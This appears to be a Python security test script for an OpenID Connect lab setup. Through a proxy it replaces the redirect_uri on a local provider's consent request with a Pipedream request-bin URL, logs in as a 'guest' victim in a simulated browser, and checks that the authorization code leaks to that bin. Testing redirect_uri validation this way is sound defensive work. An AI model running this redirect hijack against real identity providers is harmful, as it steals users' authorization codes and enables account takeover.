import sys
import os

sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), '../../osbtlib'))

from osbtlib import BrowserSimulator, Osbtlib

HONEST_RP_ENDPOINT = "http://localhost:3000"
HONEST_OP_ENDPOINT = "http://localhost:3001"
PROXY_SERVER_ENDPOINT = "http://localhost:8080"
PROXY_EXTENSION_ENDPOINT = "http://localhost:5555"

PIPEDREAM_URL = os.environ.get('PIPEDREAM_URL')
PIPEDREAM_TOKEN = os.environ.get('PIPEDREAM_TOKEN')
PIPEDREAM_SOURCE_ID = os.environ.get('PIPEDREAM_SOURCE_ID') 

# victim credentials
victim_username = 'guest'
victim_password = 'guest'

osbt = Osbtlib(
    proxy_extension_url = PROXY_EXTENSION_ENDPOINT
)

bs = BrowserSimulator(f'{HONEST_RP_ENDPOINT}/login', PROXY_SERVER_ENDPOINT)

try:
     # replace redirect_uri
    redirect_uri = PIPEDREAM_URL
    osbt.proxy.modify_query_param('redirect_uri', redirect_uri, 'localhost:3001', '/consent')    

    sso_flow = f"""
page.locator('input[name="userId"]').fill('{victim_username}')
page.locator('input[name="password"]').fill('{victim_password}')
page.locator('input[type="submit"]').click()
page.locator('input[type="submit"][value="Yes"]').click()
    """
    bs.run(sso_flow)
    
    # check requestbin history
    history = osbt.requestbin.get_requestbin_history(PIPEDREAM_TOKEN, PIPEDREAM_SOURCE_ID)
    code = history['data'][0]['event']['query']['code']
    assert(code != None)

except Exception as e:
    print('Error:', e)
    osbt.proxy.clean()